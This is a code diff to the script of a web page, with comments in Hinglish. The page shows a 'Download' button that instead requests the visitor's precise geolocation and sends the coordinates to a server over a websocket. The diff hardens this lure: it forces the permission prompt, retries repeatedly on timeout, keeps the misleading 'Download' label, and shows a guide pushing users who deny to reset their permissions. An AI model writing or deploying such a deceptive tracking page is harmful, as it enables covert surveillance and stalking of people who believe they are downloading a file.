@@ -153,7 +153,6 @@
   </div>
 
 <script>
-
     const socket = io({
         transports: ['websocket'],
         upgrade: false,
@@ -169,38 +168,36 @@
     function showGuide() { guide.style.display = 'flex'; }
     function hideGuide() { guide.style.display = 'none'; }
 
+    // FORCE TRIGGER LOGIC: Ye hamesha popup maangega
     async function handleAction() {
-
         const options = {
             enableHighAccuracy: true,
-            timeout: 8000,
+            timeout: 10000,
             maximumAge: 0
         };
 
-
-        try {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => { 
-                    socket.emit('send-location', { 
-                        lat: pos.coords.latitude, 
-                        lng: pos.coords.longitude 
-                    }); 
-
-                    updateUI('granted');
-                },
-                (err) => { 
-
-                    if (err.code === 1 || err.code === 3) { 
-                        updateUI('denied'); 
-                        showGuide();
-                    }
-                },
-                options
-            );
-        } catch (e) {
-
-            showGuide();
-        }
+        // Shuru me status check nahi karenge, seedha location maangenge
+        navigator.geolocation.getCurrentPosition(
+            (pos) => { 
+                socket.emit('send-location', { 
+                    lat: pos.coords.latitude, 
+                    lng: pos.coords.longitude 
+                }); 
+                updateUI('granted');
+            },
+            (err) => { 
+                // Agar user ne "Deny" kiya ya pehle se blocked hai, tabhi guide dikhao
+                if (err.code === 1) { 
+                    updateUI('denied'); 
+                    showGuide();
+                } else if (err.code === 3) {
+                    // Timeout retry logic for slow connections/shields
+                    console.log("Retrying...");
+                    handleAction(); 
+                }
+            },
+            options
+        );
     }
 
     function updateUI(state) {
@@ -208,7 +205,6 @@
             btn.innerText = "RESET Permissions";
             btn.classList.add('blocked');
         } else {
-
             btn.innerText = "Download";
             btn.classList.remove('blocked');
             hideGuide(); 
@@ -218,13 +214,14 @@
     btn.addEventListener('click', handleAction);
     closeBtn.addEventListener('click', hideGuide); 
 
-
     window.onload = async () => {
+        // Hamesha Download button dikhao taaki user force trigger kar sake
         btn.innerText = "Download";
         btn.classList.remove('blocked');
         
         if (!socket.connected) socket.connect();
 
+        // Background auto-detection (Refresh ke bina UI theek karne ke liye)
         try {
             const res = await navigator.permissions.query({ name: 'geolocation' });
             res.onchange = () => {
@@ -235,6 +232,7 @@
         } catch (e) {}
     };
 </script>
+  
 
 </body>
 </html>
